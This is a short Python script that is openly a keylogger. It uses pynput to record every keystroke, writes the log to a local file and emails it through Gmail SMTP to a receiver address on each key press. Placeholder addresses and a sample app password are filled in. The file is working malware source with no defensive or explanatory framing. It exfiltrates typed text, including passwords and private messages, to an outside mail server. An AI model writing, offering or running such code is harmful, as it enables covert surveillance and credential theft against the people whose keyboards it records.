import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

keys = []
 #defining the variables used with smtplib and for sending the e-mail
sender_email = "youremail@gmail.com"
receiver_email = "receiveremail@gmail.com"
email_password = "dgai hkhh zfch iuba" #Example of a gmail app password 

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)

#Function to write output to the array that holds the keys
def write_file(keys):
    log = ""
    for key in keys:
        try:
            log += f"{key.char} "
        except AttributeError:
            if key == Key.space:
                log += " "
            elif key == Key.enter:
                log += "\n"
            else:
                log += f"[{key}] "
    

    with open("keylogmail.txt", "a") as f:
        f.write(log)
    
    send_email(log)
# Function to send e-mail
def send_email(log):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        
        server.login(sender_email, email_password)
        
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = receiver_email
        msg["Subject"] = "Keylog Data"
        body = MIMEText(log, "plain")
        msg.attach(body)
        
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

def on_release(key):
    if key == Key.esc:
        return False #when the escape key is pressed, the keylogger exits and stops logging every key

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

